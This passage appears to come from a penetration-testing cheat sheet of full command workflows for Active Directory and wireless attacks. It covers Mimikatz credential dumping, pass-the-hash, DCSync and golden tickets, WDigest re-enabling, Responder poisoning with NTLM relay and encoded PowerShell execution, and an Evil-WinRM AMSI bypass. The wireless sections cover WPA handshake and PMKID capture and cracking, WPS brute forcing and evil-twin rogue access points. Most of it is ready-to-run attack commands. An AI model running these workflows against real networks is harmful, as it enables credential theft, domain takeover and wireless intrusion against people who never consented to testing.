kerberos::list               # List Kerberos tickets in memory
kerberos::list /export       # Export tickets to .kirbi files
kerberos::ptt ticket.kirbi   # Pass-the-Ticket: import .kirbi file
kerberos::purge              # Purge all Kerberos tickets
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
                             # Golden ticket: valid TGT, valid 10 years, any user/group
kerberos::silver /user:user1 /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:<hash> /ticket:silver.kirbi
                             # Silver ticket: forged service ticket (no DC contact)
```

#### token — Privilege Escalation

```
privilege::debug             # Enable SeDebugPrivilege (required for LSASS access)
privilege::id 20             # Enable specific privilege by ID
token::elevate               # Elevate to SYSTEM via token impersonation
token::list                  # List available tokens
token::impersonate           # Impersonate a token
```

#### crypto — Certificate/Key Operations

```
crypto::certificates /export            # Export all certificates
crypto::cng                             # CNG provider keys
```

### Attack Workflows

#### Pass-the-Hash (PTH)

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

This spawns a CMD window running as Administrator using the NTLM hash without knowing the plaintext password.

#### Pass-the-Ticket (PTT)

```
kerberos::list /export                  # Export existing tickets
kerberos::ptt [ticket.kirbi]            # Import and use stolen ticket
dir \\dc01\C$                           # Access DC share with impersonated ticket
```

#### DCSync Attack (Requires Domain Admin or replication rights)

```
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv > all_hashes.csv
```

DCSync does not touch LSASS on the target DC — it's a legitimate AD replication request. Much quieter than direct LSASS injection.

#### Golden Ticket Attack

```
# 1. Get krbtgt hash via DCSync
lsadump::dcsync /domain:corp.local /user:krbtgt
# -> NTLM: 1a3b456... (note this down)

# 2. Get Domain SID
# From a domain-joined machine: whoami /user -> S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX

# 3. Create golden ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123-456-789 /krbtgt:1a3b456... /ticket:golden.kirbi

# 4. Inject ticket
kerberos::ptt golden.kirbi

# 5. Access any resource
dir \\any-host\C$
```

Golden tickets bypass normal authentication and persist even after password resets (until krbtgt is rotated twice).

### Enable WDigest for Plaintext Creds (Requires Admin)

```powershell
# On Windows 8+ WDigest is disabled by default. Re-enable for later extraction:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# User must re-logon to populate plaintext creds in LSASS
```

### Offline SAM Extraction

```bash
# From a Windows machine (requires SYSTEM or offline):
reg save HKLM\SAM C:\SAM
reg save HKLM\SYSTEM C:\SYSTEM

# Then on Kali:
secretsdump.py -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## 7. Hash Capture — Responder & Evil-WinRM

### Responder

Responder poisons LLMNR, NBT-NS, and mDNS broadcast queries on a local network to capture NetNTLM hashes without any user interaction.

#### How It Works

1. Client tries to resolve `\\FILESERVER` via DNS — fails (host doesn't exist).
2. Client falls back to LLMNR/NBT-NS broadcast.
3. Responder answers "I am FILESERVER" to all queries.
4. Client sends SMB authentication with NetNTLMv2 hash.
5. Responder captures and saves the hash.

#### Installation

```bash
sudo apt install responder
ls /usr/share/responder/
```

#### Core Flags

```
-I <interface>     Network interface (required)
-w                 Start WPAD rogue proxy server
-d                 Enable DHCP poisoning
-b                 HTTP Basic Auth challenge mode
-F                 Force NTLM auth for WPAD (with -w)
-P                 Force NTLM auth for Proxy
-r                 Enable NBT-NS poisoning
-f                 Enable fingerprinting
-v                 Verbose output (show challenge/response)
--lm               Force LM hashing (for downgrade)
--disable-ess      Disable Extended Session Security
-A                 Analyze mode (sniff only, don't poison)
```

#### Configuration File

```
/etc/responder/Responder.conf
```

Key settings:
- `SQL = On/Off` — capture MSSQL hashes
- `SMB = On/Off` — capture SMB
- `FTP = On/Off`, `HTTP = On/Off`, `HTTPS = On/Off`
- `LDAP = On/Off` — capture LDAP auth
- `Challenge = Random` — use random challenge (for NTLMv2) or fixed (for NTLMv1 rainbow tables)

#### Complete Worked Examples

```bash
# ---------- Basic poison + capture ----------
sudo responder -I eth0 -rdwFbPv

# ---------- Analyze mode (passive, no poisoning) ----------
sudo responder -I eth0 -A

# ---------- Force WPAD + NTLM ----------
sudo responder -I eth0 -wF

# ---------- With verbose to see each attempt ----------
sudo responder -I eth0 -rdwFb -v

# ---------- Captured hashes location ----------
ls /usr/share/responder/logs/
# Files: SMB-NTLMv2-SSP-192.168.1.x.txt, HTTP-NTLMv2-192.168.1.x.txt, etc.
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.100.txt
```

#### Responder → Hashcat Workflow

```bash
# 1. Start Responder
sudo responder -I eth0 -rdwFbPv

# 2. Wait for a hash capture (e.g., user browses to a UNC path)
# Hash appears like:
# alice::CORP:abc1234...:def5678...:0101000000000000...

# 3. Save hash to file
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt > netntlm_hashes.txt

# 4. Crack with hashcat
hashcat -m 5600 -a 0 netntlm_hashes.txt rockyou.txt
hashcat -m 5600 -a 0 netntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 5. Show cracked
hashcat -m 5600 --show netntlm_hashes.txt
```

#### NTLM Relay (When Signing is Disabled)

```bash
# When SMB signing is disabled, don't crack — relay the hash directly

# Step 1: Identify hosts without SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
# Or: nmap --script smb2-security-mode -p 445 192.168.1.0/24

# Step 2: Disable SMB and HTTP in Responder (we'll relay, not capture)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off

# Step 3: Start Responder in analyze/poison mode
sudo responder -I eth0 -rdwPv

# Step 4: Start ntlmrelayx to relay to targets
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# With command exec:
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'powershell -enc <base64_payload>'
# Interactive SOCKS:
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
```

### Evil-WinRM

Evil-WinRM is a full-featured WinRM shell for penetration testing — supports file upload/download, PowerShell scripts, .NET DLLs, and pass-the-hash.

#### Installation

```bash
sudo apt install evil-winrm
gem install evil-winrm        # alternative
```

#### Core Syntax

```bash
evil-winrm -i <target> -u <user> -p <password>
evil-winrm -i <target> -u <user> -H <ntlm_hash>
```

#### Key Flags

```
-i <host/IP>       Target IP or hostname
-P <port>          WinRM port (default 5985, SSL: 5986)
-u <user>          Username
-p <pass>          Password
-H <hash>          NTLM hash (pass-the-hash)
-S                 Use SSL (port 5986)
-c <cert>          Path to client SSL certificate
-k <key>           Path to client SSL key
-r <realm>         Kerberos realm
-s <path>          Path to PowerShell scripts (auto-loaded)
-e <path>          Path to .exe/.dll files (for upload/invoke)
-l                 Logon type (3=network, default)
-n                 Disable colors
```

#### Built-in Shell Commands

```
upload <local> <remote>      Upload file to target
download <remote> <local>    Download file from target
menu                         Show available .NET methods and PowerShell scripts
Bypass-4MSI                  Attempt AMSI bypass
Invoke-Binary <path>         Execute .NET binary in memory
services                     List running services
```

#### Complete Worked Examples

```bash
# ---------- Standard login ----------
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123'

# ---------- Pass-the-hash ----------
evil-winrm -i 192.168.1.100 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# ---------- SSL (port 5986) ----------
evil-winrm -i 192.168.1.100 -u admin -p 'Pass123' -S -P 5986

# ---------- With scripts and executables directory ----------
evil-winrm -i 192.168.1.100 -u admin -p 'Pass123' \
  -s /usr/share/powershell-scripts/ \
  -e /opt/win-tools/

# ---------- In shell: upload/download ----------
# *Evil-WinRM* PS C:\> upload /kali/tools/mimikatz.exe C:\Windows\Temp\mimi.exe
# *Evil-WinRM* PS C:\> download C:\Windows\System32\config\SAM /kali/loot/SAM

# ---------- Run Mimikatz ----------
# *Evil-WinRM* PS C:\Windows\Temp\> .\mimi.exe "privilege::debug sekurlsa::logonpasswords exit"

# ---------- AMSI bypass ----------
# *Evil-WinRM* PS C:\> Bypass-4MSI
```

---

## 8. aircrack-ng Suite

The aircrack-ng suite is the standard toolkit for 802.11 wireless security auditing. It covers monitor mode, packet capture, injection, and WEP/WPA cracking.

### Suite Components

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Manage monitor mode interfaces |
| `airodump-ng` | Packet capture / AP enumeration |
| `aireplay-ng` | Packet injection (deauth, fake auth, ARP replay) |
| `aircrack-ng` | WEP/WPA/WPA2 key cracking |
| `airdecap-ng` | Decrypt captured WEP/WPA packets |
| `airtun-ng` | Virtual tunnel interface |
| `packetforge-ng` | Craft encrypted packets |
| `airbase-ng` | Multi-purpose access point creation |
| `airolib-ng` | Pre-computed PMK database management |
| `airgraph-ng` | Graph AP relationships |
| `airserv-ng` | Network daemon for wireless card sharing |

### airmon-ng

Manages monitor mode on wireless interfaces.

```bash
# List wireless interfaces
airmon-ng

# Check for interfering processes (kill them)
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon (or mon0 on older systems)

# Start on specific channel
sudo airmon-ng start wlan0 6

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Check for conflicting processes
sudo airmon-ng check

# Kill conflicting processes and start monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0
```

### airodump-ng

Captures 802.11 frames. Shows APs, clients, signal strength, encryption type.

```bash
# Basic scan — all channels
sudo airodump-ng wlan0mon

# Write capture to file (creates .cap, .csv, .kismet.csv, .kismet.netxml)
sudo airodump-ng -w capture wlan0mon

# Target specific BSSID and channel
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w handshake wlan0mon

# 5 GHz band only
sudo airodump-ng --band a wlan0mon

# Both 2.4 GHz and 5 GHz
sudo airodump-ng --band abg wlan0mon

# Filter output to show only WPA networks
sudo airodump-ng --encrypt WPA wlan0mon
```

#### Output Columns

| Column | Meaning |
|--------|---------|
| BSSID | AP MAC address |
| PWR | Signal strength (higher negative = stronger) |
| Beacons | Beacon frames received |
| #Data | Data frames captured |
| #/s | Frames per second |
| CH | Channel |
| MB | Max speed supported |
| ENC | Encryption (WEP/WPA/WPA2) |
| CIPHER | Cipher (CCMP/TKIP) |
| AUTH | Authentication (PSK/MGT/SAE) |
| ESSID | Network name |

In the lower section (STATION):
- BSSID: which AP the client is connected to
- STATION: client MAC address
- PWR: client signal
- Lost: packet loss
- Frames: frames captured
- Probe: networks the client is probing for

### aireplay-ng

Injects 802.11 packets to trigger events (handshakes, ARP replays).

#### Attack Numbers

| Number | Attack |
|--------|--------|
| 0 | Deauthentication |
| 1 | Fake Authentication |
| 2 | Interactive Packet Replay |
| 3 | ARP Request Replay |
| 4 | KoreK ChopChop |
| 5 | Fragmentation |
| 6 | Café-Latte |
| 7 | Client-Oriented Fragmentation |
| 8 | WPA Migration Mode |
| 9 | Injection Test |

```bash
# ---------- Test injection capability ----------
sudo aireplay-ng -9 wlan0mon
sudo aireplay-ng -9 -e "TargetSSID" -a AA:BB:CC:DD:EE:FF wlan0mon

# ---------- Deauthentication (to force WPA handshake) ----------
# Deauth all clients from AP (broadcast)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous deauth (use carefully — very noisy)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon   # 0 = unlimited

# ---------- Fake Authentication (for WEP ARP replay) ----------
sudo aireplay-ng -1 0 -e "WEP_AP" -a AA:BB:CC:DD:EE:FF -h OUR:MAC:ADDR wlan0mon
# -1 0 = fake auth with 0ms reassoc delay

# ---------- ARP Request Replay (WEP cracking) ----------
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h OUR:MAC:ADDR wlan0mon
# Captures and replays ARP to generate IVs for WEP cracking
```

### aircrack-ng

Performs the actual cracking of WEP keys or WPA/WPA2 PSK.

```bash
# ---------- WPA/WPA2 dictionary attack ----------
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# ---------- Multiple capture files ----------
aircrack-ng -w rockyou.txt capture*.cap

# ---------- WEP cracking (once enough IVs) ----------
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# ---------- WPA with pre-computed PMKs (airolib-ng) ----------
aircrack-ng -r pmk_database.db capture-01.cap

# ---------- Pass capture to hashcat (preferred for speed) ----------
# First convert .cap to .hccap / .hc22000
hcxpcapngtool -o capture.hc22000 capture-01.cap
hashcat -m 22000 capture.hc22000 rockyou.txt
```

### airdecap-ng

Decrypt captured WEP/WPA packets after cracking.

```bash
# Decrypt WPA capture
airdecap-ng -p 'thepassword' -e "SSID_Name" capture-01.cap

# Decrypt WEP
airdecap-ng -w ABCDEF0123456789ABCDEF01234 capture-01.cap

# Output: capture-01-dec.cap
```

### WPA2 Handshake Capture — End-to-End Workflow

```bash
# ================================================================
# STEP 1: Identify interface and enable monitor mode
# ================================================================
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Interface: wlan0mon

# ================================================================
# STEP 2: Scan for targets
# ================================================================
sudo airodump-ng wlan0mon
# Identify target:
#   BSSID: AA:BB:CC:DD:EE:FF
#   Channel: 6
#   ESSID: TargetNetwork
#   Client: 11:22:33:44:55:66

# ================================================================
# STEP 3: Focused capture on target AP
# ================================================================
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 \
  -w /tmp/wpa_capture wlan0mon
# Leave this running in terminal 1

# ================================================================
# STEP 4: Force handshake via deauth (terminal 2)
# ================================================================
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Watch terminal 1 for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right

# ================================================================
# STEP 5: Verify handshake captured
# ================================================================
aircrack-ng /tmp/wpa_capture-01.cap
# Should say: "1 handshake" for the target BSSID

# ================================================================
# STEP 6: Crack the handshake
# ================================================================
# Option A: aircrack-ng (slow, CPU only)
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF /tmp/wpa_capture-01.cap

# Option B: hashcat (GPU, much faster)
# Convert first
hcxpcapngtool -o /tmp/capture.hc22000 /tmp/wpa_capture-01.cap
hashcat -m 22000 -a 0 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 -a 3 /tmp/capture.hc22000 ?d?d?d?d?d?d?d?d   # 8-digit PIN
hashcat -m 22000 --show /tmp/capture.hc22000

# ================================================================
# STEP 7: Restore interface to managed mode
# ================================================================
sudo airmon-ng stop wlan0mon
sudo service NetworkManager start
```

---

## 9. wifite

wifite is an automated wireless attack tool that orchestrates aircrack-ng, hashcat, and other tools. Ideal for batch auditing multiple networks.

### Installation

```bash
sudo apt install wifite
# Or latest:
git clone https://github.com/derv82/wifite2
cd wifite2 && sudo python3 setup.py install
```

### Core Syntax

```bash
sudo wifite [options]
```

### Key Flags

```
-i <iface>         Wireless interface (auto-detects otherwise)
--kill             Kill conflicting processes automatically
--kill-conflicting Auto-kill processes that use wireless interface

# Target selection
--wpa              Only attack WPA/WPA2 networks
--wep              Only attack WEP networks
--wps              Only attack WPS-enabled networks
--pmkid            Only use PMKID attack (no deauth required)
-e <essid>         Target specific ESSID
-b <bssid>         Target specific BSSID
--skip-crack       Capture handshake but don't crack
--no-wps           Skip WPS attack even if available

# Attack options
-dict <file>       Dictionary file for cracking (default: /usr/share/wordlists/rockyou.txt)
--no-deauth        Don't send deauth packets (passive only)
--num-deauths N    Number of deauth packets (default 1)
--deauth-timeout N Seconds to wait for handshake after deauth
--wpa-attack       Method: pmkid, handshake, pmkid-then-handshake
--crack            Crack captured handshakes immediately
--hashcat          Use hashcat for cracking
-p <percentage>    Minimum signal strength to attack (0-100%)
--skip N           Skip first N targets
--power N          Minimum signal power threshold

# Output
-o / --output      Save results to file
--cracked          Show only cracked networks
--nodeauths        Skip deauth attacks

# Timeouts
--wpa-deauth-timeout N     Seconds to wait for WPA handshake
--wpa-attack-timeout N     Total attack timeout per AP
--wps-timeout N            WPS attack timeout
--wps-fail-threshold N     Fail after N consecutive WPS failures
```

### Complete Worked Examples

```bash
# ---------- Full auto attack — all available networks ----------
sudo wifite --kill

# ---------- WPA only, with custom wordlist ----------
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt --kill

# ---------- PMKID attack only (no deauth, stealthier) ----------
sudo wifite --pmkid --kill

# ---------- Target specific AP ----------
sudo wifite -b AA:BB:CC:DD:EE:FF --wpa --kill

# ---------- Target by SSID name ----------
sudo wifite -e "TargetNetwork" --kill

# ---------- WPS PIN attack ----------
sudo wifite --wps --kill

# ---------- Capture only, don't crack (for later hashcat) ----------
sudo wifite --wpa --skip-crack --kill

# ---------- Use hashcat for cracking instead of aircrack ----------
sudo wifite --wpa --hashcat --dict rockyou.txt --kill

# ---------- Strong signal only (reduces noise) ----------
sudo wifite --wpa -p 50 --kill

# ---------- Passive — no deauth ----------
sudo wifite --wpa --no-deauth --kill
```

### wifite Cracked Credentials

Wifite saves results to `~/.wifite/` and `./cracked.json` / `./hs/` (handshake files).

---

## 10. hcxdumptool + hcxtools

hcxdumptool captures PMKID and EAPOL frames directly from the wireless channel. The PMKID attack does not require a connected client — it only needs communication with the AP.

### What is PMKID?

The PMKID is derived from: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)`

Where `PMK = PBKDF2(passphrase, SSID, 4096, 32)`. If we have the PMKID we can test passphrases without any client involvement.

### Installation

```bash
sudo apt install hcxdumptool hcxtools
# Or from source for latest:
git clone https://github.com/ZerBea/hcxdumptool && cd hcxdumptool && make && sudo make install
git clone https://github.com/ZerBea/hcxtools && cd hcxtools && make && sudo make install
```

### hcxdumptool Flags

```
-i <iface>         Interface (must be capable of monitor mode)
-o <file>          Output pcapng file
--active_beacon    Send active beacons to force AP responses
--enable_status=3  Show captured PMKIDs and EAPOLs in real-time
--filterlist_ap=<file>   Filter to specific BSSIDs (one MAC per line, no colons)
--filtermode=2     Allow only listed BSSIDs (2=whitelist)
--filtermode=1     Block listed BSSIDs (1=blacklist)
--disable_deauthentication  Don't send deauth (passive mode)
--rcascan          Continuous channel scanning
-c <channel>       Stick to specific channel
```

### hcxpcapngtool Flags

Convert pcapng to hashcat-compatible format.

```
-o <file.hc22000>  Output in 22000 format (combined PMKID + EAPOL)
-E <essidlist>     Export ESSIDs
-I <identlist>     Export identities
-U <usernamelist>  Export usernames
--all              Convert everything
```

### hcxhashtool

Filter and process hc22000 hashes.

```bash
# Filter by SSID
hcxhashtool -i capture.hc22000 --essid-list=targets.txt -o filtered.hc22000

# Show contents
hcxhashtool -i capture.hc22000 --info=stdout

# Filter PMKIDs only
hcxhashtool -i capture.hc22000 --pmkid=pmkid_only.hc22000

# Filter EAPOLs only
hcxhashtool -i capture.hc22000 --eapol=eapol_only.hc22000
```

### Complete PMKID Attack Workflow

```bash
# ================================================================
# STEP 1: Prepare interface
# ================================================================
sudo airmon-ng check kill
# Note: hcxdumptool manages its own monitor mode — don't run airmon-ng start

# ================================================================
# STEP 2: Get target MAC addresses (optional filtering)
# ================================================================
# Quick scan to identify targets
sudo airodump-ng wlan0 --output-format csv -w /tmp/scan --write-interval 5 &
sleep 30 && sudo kill %1
# Extract BSSIDs from CSV (strip colons for hcxdumptool filterlist)
grep -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}' /tmp/scan-01.csv | tr ':' '' | sort -u > targets.txt

# ================================================================
# STEP 3: Capture PMKID + EAPOL frames
# ================================================================
sudo hcxdumptool -i wlan0 -o /tmp/capture.pcapng \
  --active_beacon \
  --enable_status=3 \
  --filterlist_ap=targets.txt \
  --filtermode=2
# Let run for 10-15 minutes minimum. Watch for:
# [*] 12:34 PMKID aaaa....
# [*] 12:34 EAPOL M1M2 (handshake)

# For a specific channel
sudo hcxdumptool -i wlan0 -o /tmp/capture.pcapng -c 6 \
  --active_beacon --enable_status=3

# ================================================================
# STEP 4: Convert to hashcat format
# ================================================================
hcxpcapngtool -o /tmp/capture.hc22000 /tmp/capture.pcapng
# Check what was captured:
wc -l /tmp/capture.hc22000

# Show details
hcxhashtool -i /tmp/capture.hc22000 --info=stdout

# ================================================================
# STEP 5: Crack with hashcat
# ================================================================
# Dictionary attack
hashcat -m 22000 -a 0 /tmp/capture.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 -a 0 /tmp/capture.hc22000 rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# 8-digit numeric PIN (common routers)
hashcat -m 22000 -a 3 /tmp/capture.hc22000 ?d?d?d?d?d?d?d?d

# Show cracked
hashcat -m 22000 --show /tmp/capture.hc22000

# ================================================================
# STEP 6: Restore interface
# ================================================================
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
sudo service NetworkManager start
```

### Pre-Shared Key Lookup (Passive Brute Force via hcxkeys)

```bash
# For known SSIDs, test common passwords without capturing
# hcxkeys: compute PMKIDs offline given SSID and test passwords
```

---

## 11. Kismet

Kismet is a passive wireless network detector, sniffer, and IDS. Unlike active tools, it only listens — useful for stealthy reconnaissance.

### Installation

```bash
sudo apt install kismet
```

### Core Syntax

```bash
# Start Kismet with web interface
kismet -c wlan0

# Start with specific interface and no terminal UI (daemon mode)
kismet -c wlan0 --no-ncurses-wrapper --daemonize

# Start capturing on multiple interfaces
kismet -c wlan0 -c wlan1
```

### Key Flags

```
-c <interface>     Capture source interface
--no-ncurses-wrapper  Run headless (for daemon mode)
--daemonize        Run in background
--log-prefix <path>  Log file prefix (default: Kismet-datetime)
--log-types <types>  Log types to create (pcap, kismet, json, etc.)
-f <config>        Config file path
```

### Configuration Files

```
/etc/kismet/kismet.conf         # Main config
~/.kismet/kismet_site.conf      # User overrides

# Key settings in kismet.conf:
ncsource=wlan0                  # Default capture source
logprefix=/tmp/kismet           # Log directory
logdefault=kismetdb,pcapng,json
```

### Web Interface

Kismet runs a web server on port 2501 by default.

```bash
# Access at:
http://localhost:2501

# Default credentials (set on first run)
# Username/password prompted on startup

# REST API endpoints
curl http://localhost:2501/devices/views/all/devices.json   # All devices
curl http://localhost:2501/phy/phy80211/clients.json        # 802.11 clients
```

### Command-Line API Examples

```bash
# Connect with kismetdb for post-processing
kismetdb_statistics --in Kismet-*.kismet

# Export devices to JSON
kismetdb_dump_devices --in Kismet.kismet --out devices.json

# Extract pcap
kismetdb_dump_pcap --in Kismet.kismet --out capture.pcap
```

### Kismet for WIDS

```bash
# Detect deauth attacks, fake APs, probes
# Kismet logs alerts to kismet.alert files
# Alerting configured in kismet.conf:
# alert=DEAUTHFLOOD,5/min,10/sec
# alert=NETSSIDPROBED
# alert=PROBECLIENTDEV
```

---

## 12. Wireless Recon Tools

### iwconfig

Legacy tool for basic wireless interface info and configuration.

```bash
iwconfig                           # List all wireless interfaces
iwconfig wlan0                     # Info for specific interface
iwconfig wlan0 mode monitor        # Set monitor mode (basic)
iwconfig wlan0 essid "SSID"        # Connect to SSID
iwconfig wlan0 freq 2.422G         # Set frequency (channel 3)
iwconfig wlan0 channel 6           # Set channel directly
iwconfig wlan0 txpower 20          # Set TX power in dBm
```

### iw (Modern Replacement for iwconfig)

```bash
# List wireless devices
iw dev

# Link info (connection status)
iw dev wlan0 link

# Scan for networks
sudo iw dev wlan0 scan

# Scan with specific options
sudo iw dev wlan0 scan freq 2412 2437 2462    # Scan channels 1, 6, 11

# Interface info
iw phy phy0 info

# Set monitor mode
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

# Set managed mode
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up

# Set channel
sudo iw dev wlan0mon set channel 6
sudo iw dev wlan0mon set freq 5180 HT40+    # 5 GHz with HT40

# Set TX power (regulatory)
sudo iw reg set US
sudo iw dev wlan0 set txpower fixed 2000    # 20 dBm (in mBm units)
```

### iwlist

```bash
# Scan for networks
sudo iwlist wlan0 scan
sudo iwlist wlan0 scan | grep -E "ESSID|Encryption|Signal|Channel"

# List supported channels
iwlist wlan0 channel

# List supported frequencies
iwlist wlan0 frequency

# List bitrates
iwlist wlan0 bitrate
```

### wash — WPS Network Scanner

wash scans for WPS-enabled networks and shows their WPS status (locked/unlocked).

```bash
sudo apt install reaver    # wash is bundled with reaver

# Basic scan
sudo wash -i wlan0mon

# Scan with 5 GHz band
sudo wash -i wlan0mon -5

# Write results to file
sudo wash -i wlan0mon -o wps_scan.csv

# Key output columns:
# BSSID | Ch | dBm | WPS | Lck | Vendor | ESSID
# Lck = Yes means WPS is locked (too many failed attempts)
```

### reaver — WPS PIN Brute Force

Reaver exploits the WPS protocol's flawed PIN authentication. The 8-digit PIN is verified in two 4-digit halves, reducing the keyspace from 10^8 to ~11,000 attempts.

```bash
# Basic WPS PIN attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With custom channel lock
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Pixie Dust attack (exploits weak random number generation in some APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
# -K 1 = Pixie Dust via pixiewps

# With delay between attempts (for locked APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 5 -r 3:30 -vv
# -d 5 = 5 second delay, -r 3:30 = 3 attempts then 30 sec sleep

# Specific PIN attempt
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670 -vv

# Resume session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --restored

# Save session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -s /tmp/reaver_session
```

#### pixiewps (Pixie Dust Attack)

```bash
sudo apt install pixiewps

# Automated via reaver -K 1
# Or manually:
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> \
  -a <AuthKey> -n <E-Nonce>
# Values extracted from WPS exchange with verbose reaver output
```

---

## 13. Evil Twin / Rogue AP

Evil twin attacks create a fake access point mimicking a legitimate one to capture credentials via captive portals or WPA enterprise auth.

### hostapd-wpe (WPA Enterprise Attack)

hostapd-wpe creates a rogue WPA Enterprise AP that captures MSCHAPv2 credentials when clients authenticate. The hash can be cracked offline.

```bash
sudo apt install hostapd-wpe

# Configuration file /etc/hostapd-wpe/hostapd-wpe.conf
# Key settings:
# interface=wlan0
# ssid=TargetCorpWiFi
# channel=6
# wpa=2
# wpa_key_mgmt=WPA-EAP
# eap_server=1
```

```bash
# Edit config
sudo nano /etc/hostapd-wpe/hostapd-wpe.conf
# interface=wlan0 (your deauth/monitor interface)
# ssid=<exact copy of target SSID>

# Start rogue AP
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials appear in:
# /tmp/hostapd-wpe.log
# Format: 
# username: jsmith
# challenge: ab:cd:ef:...
# response: 01:23:45:...

# Crack captured MSCHAPv2
asleap -C <challenge> -R <response> -W rockyou.txt
# Or:
hashcat -m 5500 'jsmith:::abcdef...:012345...:' rockyou.txt   # NTLMv1
```

### airbase-ng (Rogue AP / Evil Twin)

```bash
# Create basic open rogue AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Create WPA2 evil twin (same SSID as target)
sudo airbase-ng -e "TargetNetwork" -W 1 -z 4 -c 6 wlan0mon
# -W 1 = WPA2
# -z 4 = CCMP

# With karma (respond to all probe requests)
sudo airbase-ng -P -C 30 -e "FreePubWiFi" -c 1 wlan0mon
# -P = respond to all probes
# -C 30 = beacons every 30ms

# The tap interface at0 is created — bridge to internet:
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

# Enable IP forwarding and DHCP
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo dnsmasq -C /dev/null -k --dhcp-range=10.0.0.10,10.0.0.100 -i at0 &

# Enable NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -j ACCEPT
```

### bettercap

bettercap is a comprehensive network attack framework with excellent wireless support.

```bash
sudo apt install bettercap
# Or:
go install github.com/bettercap/bettercap@latest
```

#### Wireless Modules

```bash
# Start bettercap with wireless interface
sudo bettercap -iface wlan0

# In bettercap interactive shell:

# ----- Recon -----
wifi.recon on                          # Enable WiFi recon (monitor mode)
wifi.recon.channel 1,6,11             # Scan only specific channels
wifi.show                              # Show discovered APs and clients
wifi.assoc BSSID                       # Associate with AP

# ----- AP Discovery -----
wifi.recon.filter ssid contains Corp   # Filter by SSID substring

# ----- Deauth -----
wifi.deauth BSSID                      # Deauth all clients from AP
wifi.deauth CLIENT_MAC                 # Deauth specific client

# ----- Evil Twin -----
set wifi.ap.ssid TargetNetwork        # Set rogue AP SSID
set wifi.ap.bssid AA:BB:CC:DD:EE:FF   # Set specific BSSID to clone
set wifi.ap.channel 6                 # Set channel
set wifi.ap.encryption WPA2           # Set encryption type (Open for captive portal)
wifi.ap on                            # Start rogue AP

# ----- HTTP MitM (on clients connected to rogue AP) -----
net.probe on                          # Probe for hosts
http.proxy on                         # Start HTTP proxy
https.proxy on                        # Start HTTPS proxy (with MitM cert)

# ----- Captive portal -----
